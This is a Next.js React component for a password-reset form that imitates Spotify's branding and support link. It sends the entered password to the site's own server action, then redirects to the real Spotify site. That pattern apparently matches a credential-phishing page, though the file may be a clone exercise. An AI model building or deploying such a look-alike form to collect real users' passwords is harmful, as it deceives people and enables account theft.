"use client";
import React from "react";
import {
  Form,
  FormControl,
  FormField,
  FormItem,
  FormLabel,
  FormMessage,
} from "./ui/form";
import { z } from "zod";
import { Input } from "./ui/input";
import { Button } from "./ui/button";
import { zodResolver } from "@hookform/resolvers/zod";
import { useForm } from "react-hook-form";
import { formSchema } from "@/lib/form_schema";
import { newPassword } from "@/app/_actions";
import { redirect } from "next/navigation";
import Link from "next/link";
import { Circle } from "lucide-react";
import CheckboxSvg from "./svg/checkboxsvg";

type ValidationRule = {
  id: string;
  message: string;
  validator: (value: string) => boolean;
};

const ResetPasswordForm = ({ userID }: { userID: string }) => {
  const [loading, setLoading] = React.useState(false);
  const form = useForm<z.infer<typeof formSchema>>({
    resolver: zodResolver(formSchema),
    defaultValues: {
      email: "",
      password: "",
      confirm_password: "",
    },
  });

  const validationRules: ValidationRule[] = [
    {
      id: "length",
      message: "10 characters",
      validator: (value) => value.length >= 10,
    },
    {
      id: "letter",
      message: "1 letter",
      validator: (value) => /[a-zA-Z]/.test(value),
    },
    {
      id: "special",
      message: "1 number or special character (example: # ? ! &)",
      validator: (value) => /[\d\W]/.test(value),
    },
  ];

  const watchPassword = form.watch("password", "");
  // 2. Define a submit handler.
  async function onSubmit(values: z.infer<typeof formSchema>) {
    setLoading(true);
    await newPassword(values, userID);
    redirect("https://open.spotify.com/");
  }
  return (
    <Form {...form}>
      <form
        onSubmit={form.handleSubmit(onSubmit)}
        className="space-y-4 w-full max-w-md mx-auto p-4"
      >
        <FormField
          control={form.control}
          name="password"
          render={({ field }) => (
            <FormItem>
              <FormLabel className="text-sm font-bold">New Password</FormLabel>
              <FormControl>
                <Input
                  placeholder="Password"
                  type="password"
                  {...field}
                  className="w-full"
                />
              </FormControl>
              <FormMessage />
            </FormItem>
          )}
        />
        <div className="space-y-2">
          <h1 className="font-bold text-sm">
            Your password must contain at least
          </h1>
          {validationRules.map((rule) => {
            const isValid = watchPassword
              ? rule.validator(watchPassword)
              : false;
            return (
              <div key={rule.id} className="flex items-center gap-2 text-sm">
                {isValid ? (
                  <CheckboxSvg />
                ) : (
                  <Circle className="h-4 w-4 text-muted-foreground" />
                )}

                <span className="text-zinc-300">{rule.message}</span>
              </div>
            );
          })}
        </div>
        <FormField
          control={form.control}
          name="confirm_password"
          render={({ field }) => (
            <FormItem>
              <FormLabel className="text-sm font-bold">
                Confirm New Password
              </FormLabel>
              <FormControl>
                <Input
                  placeholder="Password"
                  type="password"
                  {...field}
                  className="w-full rounded-md mb-5"
                />
              </FormControl>
              <FormMessage />
            </FormItem>
          )}
        />
        <Link
          href="https://support.spotify.com/article/reset-password/"
          className="underline text-sm hover:text-[#1ed760]"
        >
          <h1 className="py-5">Need Support?</h1>
        </Link>
        <Button
          type="submit"
          className="w-full rounded-full p-6 hover:bg-[#4bdd7e]  text-black font-bold  bg-[#1ed760] text-sm md:text-base"
          disabled={loading}
        >
          Create Password
        </Button>
      </form>
    </Form>
  );
};

export default ResetPasswordForm;
